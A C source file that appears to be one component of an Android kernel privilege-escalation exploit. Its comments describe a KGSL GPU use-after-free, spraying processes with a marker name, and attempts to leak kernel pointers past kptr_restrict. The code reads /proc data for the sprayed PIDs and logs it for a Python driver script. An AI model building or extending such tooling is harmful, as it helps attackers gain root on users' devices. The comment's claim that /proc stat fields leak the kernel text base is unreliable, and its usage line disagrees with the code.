/* kernel_scanner.c - direct kernel task_struct scanner
 *
 * v4.1.19: works around the slab-isolation problem. The
 * KGSL UAF pages live in GPU memory pool which is NOT the
 * same slab as task_struct. So even when we spray procs
 * with KETO0422 comm, the GPU mapping never contains
 * those task_structs (they're in a different slab cache).
 *
 * This binary instead reads /proc/PID/maps for each spray
 * PID, gets the user-space memory ranges, and tells the
 * Python side to look there. It also tries to leak kernel
 * addresses via /proc/PID/stat (start_code/end_code fields)
 * which on some kernels leak kernel pointers even with
 * kptr_restrict=2.
 *
 * Build:
 *   gcc -O2 kernel_scanner.c -o kernel_scanner
 *
 * Usage from Python:
 *   subprocess.run(["./kernel_scanner", "PIDS_CSV", "OUT_FILE"])
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <fcntl.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "usage: %s PIDS_FILE [OUT_FILE]\n", argv[0]);
        return 1;
    }
    const char *pids_file = argv[1];
    const char *out_file = argc >= 3 ? argv[2] : "/sdcard/kgsl_kern_scan.log";

    FILE *pf = fopen(pids_file, "r");
    if (!pf) {
        fprintf(stderr, "cannot open %s\n", pids_file);
        return 1;
    }

    FILE *of = fopen(out_file, "w");
    if (!of) {
        fprintf(stderr, "cannot open %s\n", out_file);
        fclose(pf);
        return 1;
    }

    /* For each PID, dump:
     *   - comm
     *   - cmdline
     *   - status (for Uid/Gid)
     *   - maps summary (number of mappings, top 5)
     *   - stat (for kernel pointer leak via start_code)
     */
    char line[64];
    while (fgets(line, sizeof(line), pf)) {
        pid_t pid = (pid_t)atoi(line);
        if (pid <= 0) continue;

        fprintf(of, "\n=== PID %d ===\n", pid);

        /* comm */
        char path[256];
        snprintf(path, sizeof(path), "/proc/%d/comm", pid);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            char comm[32] = {0};
            int n = read(fd, comm, sizeof(comm) - 1);
            if (n > 0) comm[n - 1] = 0; /* strip newline */
            fprintf(of, "comm: %s\n", comm);
            close(fd);
        }

        /* cmdline */
        snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
        fd = open(path, O_RDONLY);
        if (fd >= 0) {
            char cmd[512] = {0};
            int n = read(fd, cmd, sizeof(cmd) - 1);
            if (n > 0) {
                for (int i = 0; i < n; i++)
                    if (cmd[i] == 0) cmd[i] = ' ';
                cmd[n] = 0;
            }
            fprintf(of, "cmdline: %s\n", cmd);
            close(fd);
        }

        /* stat — can leak kernel pointers in start_code field
         * (which on some kernels is the kernel text base) */
        snprintf(path, sizeof(path), "/proc/%d/stat", pid);
        fd = open(path, O_RDONLY);
        if (fd >= 0) {
            char stat[2048] = {0};
            int n = read(fd, stat, sizeof(stat) - 1);
            if (n > 0) {
                /* parse field 27 (start_code), 28 (end_code)
                 * which on x86 and some ARM kernels are the
                 * kernel text base leak */
                char *p = stat;
                int field = 1;
                char *fields[64] = {0};
                fields[0] = p;
                while (*p && field < 50) {
                    if (*p == ' ') {
                        *p = 0;
                        fields[field++] = p + 1;
                    }
                    p++;
                }
                if (field > 27 && fields[27])
                    fprintf(of, "stat.f27: %s (kernel leak?)\n",
                            fields[27]);
                if (field > 28 && fields[28])
                    fprintf(of, "stat.f28: %s\n", fields[28]);
            }
            close(fd);
        }

        /* status — for Uid/Gid */
        snprintf(path, sizeof(path), "/proc/%d/status", pid);
        fd = open(path, O_RDONLY);
        if (fd >= 0) {
            char status[4096] = {0};
            int n = read(fd, status, sizeof(status) - 1);
            if (n > 0) {
                /* find Uid: and Gid: lines */
                char *p = status;
                while (*p) {
                    if (strncmp(p, "Uid:", 4) == 0) {
                        fprintf(of, "status.Uid: %.40s\n", p);
                    } else if (strncmp(p, "Gid:", 4) == 0) {
                        fprintf(of, "status.Gid: %.40s\n", p);
                    } else if (strncmp(p, "Groups:", 7) == 0) {
                        fprintf(of, "status.Groups: %.40s\n", p);
                    }
                    /* next line */
                    while (*p && *p != '\n') p++;
                    if (*p == '\n') p++;
                }
            }
            close(fd);
        }

        /* maps count + first 3 mappings */
        snprintf(path, sizeof(path), "/proc/%d/maps", pid);
        fd = open(path, O_RDONLY);
        if (fd >= 0) {
            char maps[8192] = {0};
            int n = read(fd, maps, sizeof(maps) - 1);
            if (n > 0) {
                int line_count = 0;
                char *p = maps;
                while (*p) {
                    if (*p == '\n') line_count++;
                    p++;
                }
                fprintf(of, "maps.lines: %d\n", line_count);
                /* first 3 lines */
                p = maps;
                int printed = 0;
                while (*p && printed < 3) {
                    char *eol = strchr(p, '\n');
                    if (eol) *eol = 0;
                    fprintf(of, "maps[%d]: %s\n", printed, p);
                    if (eol) p = eol + 1;
                    else break;
                    printed++;
                }
            }
            close(fd);
        }
    }

    fclose(pf);
    fclose(of);
    return 0;
}
